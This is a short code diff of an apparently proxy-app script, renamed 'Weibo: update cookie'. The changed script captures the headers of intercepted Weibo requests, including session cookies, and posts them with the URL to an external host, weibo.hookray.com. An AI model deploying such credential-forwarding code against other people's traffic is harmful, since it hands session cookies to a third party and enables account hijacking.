@@ -1,4 +1,4 @@
-const $ = new Env('weibo-location');
+const $ = new Env('微博:更新Cookie');
 
 
 !(async () => {
@@ -11,13 +11,13 @@ const $ = new Env('weibo-location');
     .catch((e) => $.logErr(e))
     .finally(() => $.done({ body: $response.body }));
 
+
 async function upload() {
     return new Promise(resolve => {
         const opts = {};
-        opts.url = "https://weibo.hookray.com/location";
+        opts.url = "https://weibo.hookray.com/cookie";
         opts.body = JSON.stringify({
             headers: $request.headers,
-            body: $response.body,
             url: $request.url
         });
         opts.headers = {
